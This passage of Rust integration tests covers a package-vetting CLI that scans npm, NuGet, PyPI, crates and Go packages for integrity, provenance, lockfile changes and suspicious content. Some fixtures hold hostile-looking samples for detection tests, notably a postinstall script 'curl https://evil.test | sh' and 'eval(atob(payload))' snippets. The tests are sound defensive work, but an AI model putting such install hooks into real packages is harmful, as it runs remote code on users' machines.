            r#"{{"name":"evil-pkg","version":"1.0.0","dist":{{"tarball":"{base}/evil.tgz","integrity":"sha512-{digest}"}}}}"#
        );
        let mut routes = HashMap::new();
        routes.insert("/evil-pkg/1.0.0".to_string(), (200, doc.into_bytes()));
        routes.insert("/evil.tgz".to_string(), (200, archive.clone()));
        routes
    });

    let output = registry
        .command()
        .args(["inspect", "npm", "evil-pkg@1.0.0", "--json"])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["integrity"], "verified");
    assert_eq!(value["files_scanned"], 1);
    let obfuscated = value["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["rule"] == "JS-OBF-001")
        .expect("missing encoded-execution finding");
    assert_eq!(obfuscated["file"], "lib/install.js");
    assert_eq!(value["exit_code"], 2);
}

fn npm_tarball_routes(
    base: &str,
    packages: &[(&str, &str, &[u8])],
) -> HashMap<String, (u16, Vec<u8>)> {
    use base64::Engine as _;
    use sha2::Digest as _;
    let mut routes = HashMap::new();
    for (name, version, archive) in packages {
        let digest =
            base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(*archive));
        let doc = format!(
            r#"{{"name":"{name}","version":"{version}","dist":{{"tarball":"{base}/{name}-{version}.tgz","integrity":"sha512-{digest}"}}}}"#
        );
        routes.insert(format!("/{name}/{version}"), (200, doc.into_bytes()));
        routes.insert(format!("/{name}-{version}.tgz"), (200, archive.to_vec()));
    }
    routes
}

#[test]
fn diff_reports_added_files_scripts_and_new_findings() {
    let old = tar_gz(&[("lib/a.js", b"eval(atob(x))\n"), ("old.txt", b"old\n")]);
    let new = tar_gz(&[
        ("lib/a.js", b"const a = 1;\n"),
        ("new.sh", b"#!/bin/sh\necho hi\n"),
    ]);
    let registry = MockRegistry::start_with(|base| {
        npm_tarball_routes(base, &[("pkg", "1.0.0", &old), ("pkg", "1.1.0", &new)])
    });

    let output = registry
        .command()
        .args(["diff", "npm", "pkg@1.0.0", "pkg@1.1.0", "--json"])
        .assert()
        .code(1)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["added"], serde_json::json!(["new.sh"]));
    assert_eq!(value["removed"], serde_json::json!(["old.txt"]));
    assert_eq!(value["modified"], serde_json::json!(["lib/a.js"]));
    assert!(
        value["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["rule"] == "DIFF-NEW-SCRIPT-001"),
        "{}",
        value["findings"]
    );
    assert!(
        value["resolved"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["rule"] == "JS-OBF-001"),
        "{}",
        value["resolved"]
    );
}

#[test]
fn diff_flags_a_changed_install_script_and_a_new_binary() {
    let old = tar_gz(&[
        (
            "package.json",
            br#"{"scripts":{"postinstall":"node build.js"}}"#,
        ),
        ("index.js", b"const a = 1;\n"),
    ]);
    let new = tar_gz(&[
        (
            "package.json",
            br#"{"scripts":{"postinstall":"curl https://evil.test | sh"}}"#,
        ),
        ("index.js", b"const a = 1;\n"),
        ("native/addon.node", b"\x00\x01\x02binary"),
    ]);
    let registry = MockRegistry::start_with(|base| {
        npm_tarball_routes(base, &[("pkg", "1.0.0", &old), ("pkg", "2.0.0", &new)])
    });

    let output = registry
        .command()
        .args(["diff", "npm", "pkg@1.0.0", "pkg@2.0.0", "--json"])
        .assert()
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let findings = value["findings"].as_array().unwrap();
    let install = findings
        .iter()
        .find(|finding| finding["rule"] == "DIFF-INSTALL-SCRIPTS-001")
        .unwrap_or_else(|| panic!("missing install-script finding: {value}"));
    assert_eq!(install["severity"], "high");
    assert_eq!(value["exit_code"], 2);

    let binary = findings
        .iter()
        .find(|finding| finding["rule"] == "DIFF-NEW-BINARY-001")
        .expect("missing binary finding");
    assert_eq!(binary["file"], "native/addon.node");
    assert_eq!(binary["severity"], "info");
}

#[test]
fn inspect_notes_a_nuget_signature_file_without_verifying_it() {
    let nupkg = zip_archive(&[
        ("lib/net8.0/A.dll", b"compiled"),
        (".signature.p7s", b"\x00\x01signature"),
    ]);
    let registry = MockRegistry::start_with(move |_base| {
        let mut routes = HashMap::new();
        routes.insert(
            "/v3-flatcontainer/foo/1.0.0/foo.1.0.0.nupkg".to_string(),
            (200, nupkg.clone()),
        );
        routes
    });

    let output = registry
        .command()
        .args(["inspect", "nuget", "Foo@1.0.0", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["package_signature"], "present");
    assert_eq!(value["integrity"], "unverified");
}

#[test]
fn inspect_verifies_npm_provenance_offline() {
    use base64::Engine as _;
    use sha2::Digest as _;

    let tarball = include_bytes!("fixtures/semver-7.8.6.tgz");
    let attestation = include_str!("fixtures/semver-7.8.6-attestation.json");
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(tarball));
    let registry = MockRegistry::start_with(move |base| {
        let doc = format!(
            r#"{{"name":"semver","version":"7.8.6","dist":{{"tarball":"{base}/semver.tgz","integrity":"sha512-{digest}","attestations":{{"url":"{base}/attestation"}}}}}}"#
        );
        let mut routes = HashMap::new();
        routes.insert("/semver/7.8.6".to_string(), (200, doc.into_bytes()));
        routes.insert("/semver.tgz".to_string(), (200, tarball.to_vec()));
        routes.insert(
            "/attestation".to_string(),
            (200, attestation.as_bytes().to_vec()),
        );
        routes
    });

    let output = registry
        .command()
        .args(["inspect", "npm", "semver@7.8.6", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["provenance"]["status"], "verified", "{value}");
    assert_eq!(value["provenance"]["certificate"], true);
    assert_eq!(value["provenance"]["sct"], true);
    assert_eq!(value["provenance"]["tlog"], true);
    assert!(
        value["provenance"]["identity"]
            .as_str()
            .unwrap()
            .contains("node-semver"),
        "{value}"
    );

    // A published attestation that cannot be fetched is "unverified" with a
    // reason, never silently treated as absent.
    let tarball = include_bytes!("fixtures/semver-7.8.6.tgz");
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(tarball));
    let registry = MockRegistry::start_with(move |base| {
        let doc = format!(
            r#"{{"name":"semver","version":"7.8.6","dist":{{"tarball":"{base}/semver.tgz","integrity":"sha512-{digest}","attestations":{{"url":"{base}/missing-attestation"}}}}}}"#
        );
        let mut routes = HashMap::new();
        routes.insert("/semver/7.8.6".to_string(), (200, doc.into_bytes()));
        routes.insert("/semver.tgz".to_string(), (200, tarball.to_vec()));
        routes
    });
    let output = registry
        .command()
        .args(["inspect", "npm", "semver@7.8.6", "--json"])
        .assert()
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["provenance"]["status"], "unverified", "{value}");
    assert!(value["provenance"]["reason"].is_string(), "{value}");
}

#[test]
fn inspect_discloses_files_the_size_cap_skipped() {
    let big = vec![b'a'; 6 * 1024 * 1024];
    let archive = tar_gz(&[("big.js", &big)]);
    let registry =
        MockRegistry::start_with(|base| npm_tarball_routes(base, &[("big", "1.0.0", &archive)]));

    let output = registry
        .command()
        .args(["inspect", "npm", "big@1.0.0", "--json"])
        .assert()
        .code(1)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let finding = value["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["rule"] == "archive-partially-scanned")
        .unwrap_or_else(|| panic!("missing partial-scan finding: {value}"));
    assert_eq!(finding["severity"], "warn");
    assert!(finding["evidence"].as_str().unwrap().contains("big.js"));
}

#[test]
fn inspect_rejects_a_zip_that_expands_past_the_configured_cap() {
    let block = vec![0u8; 1024 * 1024];
    let files: Vec<(&str, &[u8])> = vec![
        ("lib/a.bin", &block),
        ("lib/b.bin", &block),
        ("lib/c.bin", &block),
        ("lib/d.bin", &block),
        ("lib/e.bin", &block),
        ("lib/f.bin", &block),
    ];
    let nupkg = zip_archive(&files);
    let registry = MockRegistry::start_with(move |_base| {
        let mut routes = HashMap::new();
        routes.insert(
            "/v3-flatcontainer/bomb/1.0.0/bomb.1.0.0.nupkg".to_string(),
            (200, nupkg.clone()),
        );
        routes
    });
    let directory = tempfile::tempdir().unwrap();
    let config = directory.path().join(".depvet.toml");
    std::fs::write(&config, "[inspect]\nmax_decompressed_mb = 1\n").unwrap();

    let output = registry
        .command()
        .args([
            "inspect",
            "nuget",
            "bomb@1.0.0",
            "--json",
            "--config",
            config.to_str().unwrap(),
        ])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let finding = value["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["rule"] == "archive-decompression-bomb")
        .unwrap_or_else(|| panic!("missing bomb finding: {value}"));
    assert_eq!(finding["severity"], "high");
    assert!(
        value["not_checked"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item.as_str().unwrap_or("").contains("decompression")),
        "{value}"
    );
}

fn inspect_npm_routes(
    base: &str,
    archive: &[u8],
    tarball_responses: Vec<(u16, Vec<u8>)>,
) -> HashMap<String, Vec<(u16, Vec<u8>)>> {
    use base64::Engine as _;
    use sha2::Digest as _;
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(archive));
    let doc = format!(
        r#"{{"name":"retry-pkg","version":"1.0.0","dist":{{"tarball":"{base}/retry.tgz","integrity":"sha512-{digest}"}}}}"#
    );
    let mut routes = HashMap::new();
    routes.insert(
        "/retry-pkg/1.0.0".to_string(),
        vec![(200, doc.into_bytes())],
    );
    routes.insert("/retry.tgz".to_string(), tarball_responses);
    routes
}

fn tarball_requests(registry: &MockRegistry) -> usize {
    registry
        .requests()
        .iter()
        .filter(|path| path.as_str() == "/retry.tgz")
        .count()
}

#[test]
fn inspect_retries_transient_tarball_failures() {
    let archive = tar_gz(&[("index.js", b"const a = 1;\n")]);
    let registry = MockRegistry::start_scripted(|base| {
        inspect_npm_routes(
            base,
            &archive,
            vec![
                (500, b"boom".to_vec()),
                (500, b"boom".to_vec()),
                (200, archive.clone()),
            ],
        )
    });

    registry
        .command()
        .args(["inspect", "npm", "retry-pkg@1.0.0", "--no-cache"])
        .assert()
        .code(0);
    assert_eq!(tarball_requests(&registry), 3);
}

#[test]
fn inspect_honours_retry_after_for_rate_limits() {
    let archive = tar_gz(&[("index.js", b"const a = 1;\n")]);
    let registry = MockRegistry::start_scripted(|base| {
        inspect_npm_routes(
            base,
            &archive,
            vec![(429, b"slow down".to_vec()), (200, archive.clone())],
        )
    });

    registry
        .command()
        .args(["inspect", "npm", "retry-pkg@1.0.0", "--no-cache"])
        .assert()
        .code(0);
    assert_eq!(tarball_requests(&registry), 2);
}

#[test]
fn inspect_retries_an_interrupted_download() {
    let archive = tar_gz(&[("index.js", b"const a = 1;\n")]);
    let registry = MockRegistry::start_scripted(|base| {
        inspect_npm_routes(
            base,
            &archive,
            vec![
                (0, archive[..archive.len() / 2].to_vec()),
                (200, archive.clone()),
            ],
        )
    });

    registry
        .command()
        .args(["inspect", "npm", "retry-pkg@1.0.0", "--no-cache"])
        .assert()
        .code(0);
    assert_eq!(tarball_requests(&registry), 2);
}

#[test]
fn a_failed_download_is_not_cached() {
    let unique = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let archive = tar_gz(&[("index.js", format!("const a = {unique};\n").as_bytes())]);
    let failing = MockRegistry::start_scripted(|base| {
        inspect_npm_routes(
            base,
            &archive,
            vec![
                (500, b"boom".to_vec()),
                (500, b"boom".to_vec()),
                (500, b"boom".to_vec()),
            ],
        )
    });
    failing
        .command()
        .args(["inspect", "npm", "retry-pkg@1.0.0"])
        .assert()
        .code(3);

    let missing = MockRegistry::start_scripted(|base| {
        inspect_npm_routes(base, &archive, vec![(404, b"gone".to_vec())])
    });
    missing
        .command()
        .args(["inspect", "npm", "retry-pkg@1.0.0"])
        .assert()
        .code(3);
}

#[test]
fn inspect_does_not_retry_a_missing_tarball() {
    let archive = tar_gz(&[("index.js", b"const a = 1;\n")]);
    let registry = MockRegistry::start_scripted(|base| {
        inspect_npm_routes(base, &archive, vec![(404, b"gone".to_vec())])
    });

    registry
        .command()
        .args(["inspect", "npm", "retry-pkg@1.0.0", "--no-cache"])
        .assert()
        .code(3);
    assert_eq!(tarball_requests(&registry), 1);
}

#[test]
fn inspect_rejects_an_archive_over_the_configured_download_cap() {
    // Incompressible bytes, so gzip cannot hide the size.
    let mut state = 0x1234_5678_u32;
    let mut payload = Vec::with_capacity(2 * 1024 * 1024);
    for _ in 0..2 * 1024 * 1024 {
        state ^= state << 13;
        state ^= state >> 17;
        state ^= state << 5;
        payload.push(state as u8);
    }
    let archive = tar_gz(&[("index.js", &payload)]);
    let registry = MockRegistry::start_scripted(|base| {
        inspect_npm_routes(
            base,
            &archive,
            vec![(200, archive.clone()), (200, archive.clone())],
        )
    });
    let directory = tempfile::tempdir().unwrap();
    let config = directory.path().join(".depvet.toml");
    std::fs::write(&config, "[inspect]\nmax_download_mb = 1\n").unwrap();

    registry
        .command()
        .args([
            "inspect",
            "npm",
            "retry-pkg@1.0.0",
            "--no-cache",
            "--config",
            config.to_str().unwrap(),
        ])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("larger than"));
    assert_eq!(tarball_requests(&registry), 1);
}

#[test]
fn inspect_reports_a_checksum_mismatch_as_high() {
    use base64::Engine as _;
    let archive = tar_gz(&[("index.js", b"const a = 1;\n")]);
    let wrong = base64::engine::general_purpose::STANDARD.encode([0u8; 64]);
    let registry = MockRegistry::start_with(|base| {
        let doc = format!(
            r#"{{"name":"bad-sum","version":"1.0.0","dist":{{"tarball":"{base}/bad.tgz","integrity":"sha512-{wrong}"}}}}"#
        );
        let mut routes = HashMap::new();
        routes.insert("/bad-sum/1.0.0".to_string(), (200, doc.into_bytes()));
        routes.insert("/bad.tgz".to_string(), (200, archive.clone()));
        routes
    });

    registry
        .command()
        .args(["inspect", "npm", "bad-sum@1.0.0", "--json"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("ARCHIVE-CHECKSUM-001"))
        .stdout(predicate::str::contains("MISMATCH"));
}

#[test]
fn verified_archives_are_cached_and_reexamined_without_downloading() {
    use base64::Engine as _;
    use sha2::Digest as _;

    let archive = tar_gz(&[("index.js", b"const a = 1;\n")]);
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(&archive));
    let registry = MockRegistry::start_with(|base| {
        let doc = format!(
            r#"{{"name":"cached-pkg","version":"1.0.0","dist":{{"tarball":"{base}/cached.tgz","integrity":"sha512-{digest}"}}}}"#
        );
        let mut routes = HashMap::new();
        routes.insert("/cached-pkg/1.0.0".to_string(), (200, doc.into_bytes()));
        routes.insert("/cached.tgz".to_string(), (200, archive.clone()));
        routes
    });
    let cache = tempfile::tempdir().unwrap();

    for _ in 0..2 {
        registry
            .command()
            .env("DEPVET_NO_CACHE", "0")
            .env("DEPVET_CACHE_DIR", cache.path())
            .args(["inspect", "npm", "cached-pkg@1.0.0"])
            .assert()
            .code(0);
    }
    assert_eq!(
        registry
            .requests()
            .iter()
            .filter(|path| path.contains("cached.tgz"))
            .count(),
        1,
        "second run must reuse the verified archive"
    );

    registry
        .command()
        .env("DEPVET_NO_CACHE", "0")
        .env("DEPVET_CACHE_DIR", cache.path())
        .args(["inspect", "npm", "cached-pkg@1.0.0", "--no-cache"])
        .assert()
        .code(0);
    assert_eq!(
        registry
            .requests()
            .iter()
            .filter(|path| path.contains("cached.tgz"))
            .count(),
        2,
        "--no-cache must re-download"
    );
}

#[test]
fn inspect_respects_disabled_rules_from_config() {
    use base64::Engine as _;
    use sha2::Digest as _;

    let archive = tar_gz(&[("lib/install.js", b"eval(atob(payload))\n")]);
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(&archive));
    let registry = MockRegistry::start_with(|base| {
        let doc = format!(
            r#"{{"name":"evil-pkg","version":"1.0.0","dist":{{"tarball":"{base}/evil.tgz","integrity":"sha512-{digest}"}}}}"#
        );
        let mut routes = HashMap::new();
        routes.insert("/evil-pkg/1.0.0".to_string(), (200, doc.into_bytes()));
        routes.insert("/evil.tgz".to_string(), (200, archive.clone()));
        routes
    });
    let dir = tempfile::tempdir().unwrap();
    let config = dir.path().join(".depvet.toml");
    std::fs::write(
        &config,
        "[inspect]\ndisabled_rules = [\"JS-EXEC-001\", \"JS-OBF-001\"]\n",
    )
    .unwrap();

    registry
        .command()
        .args([
            "inspect",
            "npm",
            "evil-pkg@1.0.0",
            "--config",
            config.to_str().unwrap(),
        ])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("no findings"));
}

#[test]
fn inspect_jsr_is_honestly_unavailable() {
    let registry = MockRegistry::start(HashMap::new());
    registry
        .command()
        .args(["inspect", "jsr", "@std/assert@1.0.19"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("not documented yet"));
}

#[test]
fn a_deeply_popular_package_is_not_a_typosquat() {
    let package = PackageFixture::clean("next");
    let registry = registry_and_osv(&[package], Some(98_000_000), 200, "{}", None);

    registry
        .command()
        .args(["npm", "next"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("typosquat").not())
        .stdout(predicate::str::contains("use jest").not())
        .stdout(predicate::str::contains("INFO (exit 0)"));
}

#[test]
fn piped_audits_print_no_progress_line() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("clean-pkg", "1.0.0")]),
    );
    let registry = registry_with(&[PackageFixture::clean("clean-pkg")], None);

    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("auditing"), "progress leaked: {stderr}");
}

#[test]
fn audit_reports_uncheckable_packages_as_incomplete() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("clean-pkg", "1.0.0"), ("ghost-pkg", "1.0.0")]),
    );

    let registry = registry_with(&[PackageFixture::clean("clean-pkg")], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json"])
        .assert()
        .code(3)
        .stdout(predicate::str::contains("ghost-pkg@1.0.0"))
        .stdout(predicate::str::contains("incomplete"));
}

#[test]
fn audit_rejects_version_one_lockfiles() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("package-lock.json"),
        r#"{ "lockfileVersion": 1, "dependencies": {} }"#,
    )
    .unwrap();

    binary()
        .current_dir(directory.path())
        .args(["audit", "package-lock.json"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains(
            "lockfileVersion 1 is not supported",
        ));
}

#[test]
fn audit_without_a_lockfile_is_a_tool_error() {
    let directory = tempfile::tempdir().unwrap();
    binary()
        .current_dir(directory.path())
        .args(["audit", "package-lock.json"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("could not read"));
}

#[test]
fn audit_reads_cargo_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("Cargo.lock"),
        r#"version = 3

[[package]]
name = "serde"
version = "1.0.229"
source = "registry+https://github.com/rust-lang/crates.io-index"
"#,
    )
    .unwrap();

    let registry = crates_registry(
        "serde",
        SERDE_CRATE,
        Some(r#"{"users":[{"login":"dtolnay"}]}"#),
    );
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "Cargo.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"][0]["name"], "serde");
    assert_eq!(value["packages"][0]["ecosystem"], "crates");
}

#[test]
fn audit_reads_go_mod() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("go.mod"),
        "module example.com/app\n\ngo 1.22\n\nrequire github.com/gin-gonic/gin v1.9.1\n",
    )
    .unwrap();

    let registry = go_registry(GIN_ROUTE, 200, GIN_MODULE);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "go.mod", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"][0]["name"], "github.com/gin-gonic/gin");
    assert_eq!(value["packages"][0]["ecosystem"], "go");
}

#[test]
fn audit_reads_requirements_and_reports_unpinned_entries() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("requirements.txt"),
        "flask==3.1.0\nunpinned-pkg\n",
    )
    .unwrap();

    let registry = pypi_registry("flask", PYPI_WHEEL);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "requirements.txt", "--json"])
        .assert()
        .code(3)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"][0]["name"], "flask");
    assert_eq!(value["errors"][0]["package"], "unpinned-pkg");
    assert!(
        value["errors"][0]["message"]
            .as_str()
            .unwrap()
            .contains("not pinned with ==")
    );
}

#[test]
fn audit_reads_pipfile_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("Pipfile.lock"),
        r#"{
            "_meta": { "hash": { "sha256": "abc" } },
            "default": {
                "flask": { "version": "==3.1.0", "hashes": ["sha256:x"] },
                "local-pkg": { "path": "." }
            },
            "develop": {}
        }"#,
    )
    .unwrap();

    let registry = pypi_registry("flask", PYPI_WHEEL);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "Pipfile.lock", "--json"])
        .assert()
        .code(3)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["packages"][0]["name"], "flask");
    assert_eq!(value["packages"][0]["version"], "3.1.0");
    assert_eq!(value["errors"][0]["package"], "local-pkg");
}

#[test]
fn lock_diffs_a_cargo_lock_against_a_ref() {
    let repo = Repo::new();
    repo.write(
        "Cargo.lock",
        r#"version = 3

[[package]]
name = "serde"
version = "1.0.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
"#,
    );
    repo.commit("base");
    repo.write(
        "Cargo.lock",
        r#"version = 3

[[package]]
name = "serde"
version = "1.0.229"
source = "registry+https://github.com/rust-lang/crates.io-index"
"#,
    );

    let registry = crates_registry(
        "serde",
        SERDE_CRATE,
        Some(r#"{"users":[{"login":"dtolnay"}]}"#),
    );
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "Cargo.lock", "--base", "HEAD"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("1 new package"))
        .stdout(predicate::str::contains("serde@1.0.229"));
}

#[test]
fn audit_rejects_unknown_lockfile_formats() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(directory.path().join("go.sum"), "").unwrap();
    binary()
        .current_dir(directory.path())
        .args(["audit", "go.sum"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("unsupported lockfile"));
}

#[test]
fn audit_reads_poetry_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("poetry.lock"),
        r#"
[[package]]
name = "flask"
version = "3.1.0"
description = "A simple framework"
optional = false
python-versions = ">=3.9"
"#,
    )
    .unwrap();

    let registry = pypi_registry("flask", PYPI_WHEEL);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "poetry.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"][0]["name"], "flask");
    assert_eq!(value["packages"][0]["ecosystem"], "pypi");
}

#[test]
fn audit_reads_uv_lock_and_ignores_the_local_project() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("uv.lock"),
        r#"
version = 1

[[package]]
name = "flask"
version = "3.1.0"
source = { registry = "https://pypi.org/simple" }

[[package]]
name = "my-project"
version = "0.1.0"
source = { editable = "." }
"#,
    )
    .unwrap();

    let registry = pypi_registry("flask", PYPI_WHEEL);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "uv.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["packages"][0]["name"], "flask");
}

#[test]
fn lock_diffs_a_poetry_lock_against_a_ref() {
    let repo = Repo::new();
    repo.write(
        "poetry.lock",
        r#"
[[package]]
name = "flask"
version = "3.0.0"
"#,
    );
    repo.commit("base");
    repo.write(
        "poetry.lock",
        r#"
[[package]]
name = "flask"
version = "3.1.0"
"#,
    );

    let registry = pypi_registry("flask", PYPI_WHEEL);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "poetry.lock", "--base", "HEAD"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("1 new package"))
        .stdout(predicate::str::contains("flask@3.1.0"));
}

fn js_fixture() -> PackageFixture<'static> {
    PackageFixture {
        version: "7.0.0",
        ..PackageFixture::clean("is-number")
    }
}

#[test]
fn audit_reads_bun_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("bun.lock"),
        r#"{
  "lockfileVersion": 2,
  "workspaces": { "": { "name": "app" } },
  "packages": {
    "is-number": ["is-number@7.0.0", "", {}, "sha512-x"],
  },
}"#,
    )
    .unwrap();

    let registry = registry_with(&[js_fixture()], None);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "bun.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"][0]["name"], "is-number");
    assert_eq!(value["packages"][0]["ecosystem"], "npm");
}

#[test]
fn audit_reads_pnpm_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("pnpm-lock.yaml"),
        "lockfileVersion: '9.0'\npackages:\n  is-number@7.0.0: {}\nsnapshots:\n  is-number@7.0.0: {}\n",
    )
    .unwrap();

    let registry = registry_with(&[js_fixture()], None);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "pnpm-lock.yaml", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"][0]["name"], "is-number");
}

#[test]
fn audit_reads_yarn_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("yarn.lock"),
        "is-number@7.0.0:\n  version \"7.0.0\"\n  resolved \"https://registry.yarnpkg.com/is-number/-/is-number-7.0.0.tgz\"\n",
    )
    .unwrap();

    let registry = registry_with(&[js_fixture()], None);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "yarn.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"][0]["name"], "is-number");
}

#[test]
fn lock_diffs_a_bun_lock_against_a_ref() {
    let repo = Repo::new();
    repo.write(
        "bun.lock",
        r#"{
  "lockfileVersion": 2,
  "packages": {
    "is-number": ["is-number@6.0.0", "", {}, "sha512-old"],
  },
}"#,
    );
    repo.commit("base");
    repo.write(
        "bun.lock",
        r#"{
  "lockfileVersion": 2,
  "packages": {
    "is-number": ["is-number@7.0.0", "", {}, "sha512-new"],
  },
}"#,
    );

    let registry = registry_with(&[js_fixture()], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "bun.lock", "--base", "HEAD"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("1 new package"))
        .stdout(predicate::str::contains("is-number@7.0.0"));
}

#[test]
fn allowlist_downgrades_a_finding_and_keeps_the_reason() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join(".depvet.toml"),
        "[[allow]]\npackage = \"crossenv\"\nfinding = \"typosquat\"\nreason = \"internal fork, reviewed 2026-11\"\n",
    )
    .unwrap();

    let suspicious = PackageFixture {
        version: "0.0.2-security",
        ..PackageFixture::clean("crossenv")
    };
    let registry = registry_with(&[suspicious], None);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["npm", "crossenv", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["exit_code"], 0);
    assert_eq!(value["findings"][0]["allowed"], true);
    assert_eq!(value["findings"][0]["severity"], "info");
    assert!(
        value["findings"][0]["detail"]
            .as_str()
            .unwrap()
            .contains("internal fork, reviewed 2026-11")
    );
}

#[test]
fn allowlist_marks_the_finding_in_the_human_report() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join(".depvet.toml"),
        "[[allow]]\npackage = \"crossenv\"\nreason = \"accepted\"\n",
    )
    .unwrap();

    let suspicious = PackageFixture {
        version: "0.0.2-security",
        ..PackageFixture::clean("crossenv")
    };
    let registry = registry_with(&[suspicious], None);
    registry
        .command()
        .current_dir(directory.path())
        .args(["npm", "crossenv"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("[ALLOWED]"))
        .stdout(predicate::str::contains(
            "allowed by .depvet.toml: accepted",
        ));
}

#[test]
fn allowlist_applies_to_lockfile_audits() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("evil-pkg", "1.0.0")]),
